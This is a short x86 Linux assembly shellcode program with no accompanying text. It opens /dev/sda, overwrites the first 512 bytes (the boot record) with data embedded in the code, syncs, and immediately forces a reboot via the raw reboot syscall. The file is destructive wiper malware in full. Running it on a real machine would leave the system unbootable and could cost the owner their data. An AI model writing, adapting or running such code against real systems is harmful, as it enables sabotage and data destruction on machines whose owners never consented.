
global _start

section .text

_start:
    jmp loader

    body:
    pop esi

    xor eax, eax
    push eax

    push dword '/sda'   ; device to rewrite boot record
    push dword '/dev'    

    mov ebx, esp
    mov ecx, 0x0401     ; write-only flags
    mov eax, 0x05
 
    int 0x80            ; SYS_OPEN
    mov ebx, eax        ; EBX stores file descriptor
  
    mov ecx, esi
    mov edx, 0x200       ; 512 bytes to be written into /dev/sda
    mov eax, 0x04

    int 0x80            ; SYS_WRITE


    mov eax, 0x76       ; SYS_FSYNC
    int 0x80
    
    mov eax, 0x06
    int 0x80            ; SYS_CLOSE


    mov ebx, 0xfee1dead ; magic number 1
    mov ecx, 0x28121969 ; magic number 2
    mov edx, 0x1234567  ; LINUX_REBOOT_CMD_RESTART command
    mov eax, 0x58

    int 0x80            ; SYS_REBOOT

loader: 
    call body
    db 0xAA, 0xBB, 0xCC